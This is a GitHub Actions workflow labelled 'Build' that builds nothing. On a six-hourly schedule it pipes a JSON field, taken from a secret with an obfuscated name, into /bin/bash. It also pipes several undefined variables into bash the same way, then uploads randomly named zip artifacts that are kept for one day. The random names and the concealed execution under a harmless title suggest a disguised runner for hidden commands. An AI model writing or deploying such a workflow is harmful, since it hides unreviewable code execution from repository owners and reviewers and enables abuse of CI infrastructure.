name: Build
on:
  workflow_dispatch:

  schedule:
    - cron: '5 2,8,14,20 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          vq03420: ${{ secrets.vq03420 }}
        run: |
          printf '%s' "$vq03420" | jq -r .dogso8 | /bin/bash
          echo $domi488 | jq -r .xv7279 | /bin/bash
          printf '%s' "$fzdl513" | jq -r .ny20 | /bin/bash
          printf '%s' "$fv5675" | jq -r .iba66 | /bin/bash
          echo $khfpm40 | jq -r .vfg6621 | /bin/bash

      - name: Archive results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: wErCjXhu
          path: "*.zip"
          retention-days: 1
